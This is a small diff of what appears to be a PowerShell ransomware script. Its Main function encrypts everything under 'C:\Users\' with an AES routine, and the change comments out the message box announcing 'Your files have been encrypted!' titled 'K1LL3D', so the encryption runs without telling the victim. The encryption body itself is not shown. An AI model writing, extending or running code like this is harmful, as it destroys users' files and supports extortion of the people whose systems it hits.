@@ -57,7 +57,7 @@ function MessageBox_Create {
 function Main {
     Encrypt-FilesAES -directoryPath "C:\Users\"
 
-    MessageBox_Create -Message "Your files have been encrypted!" -Title "K1LL3D"
+    #MessageBox_Create -Message "Your files have been encrypted!" -Title "K1LL3D"
 
     return $null
 }
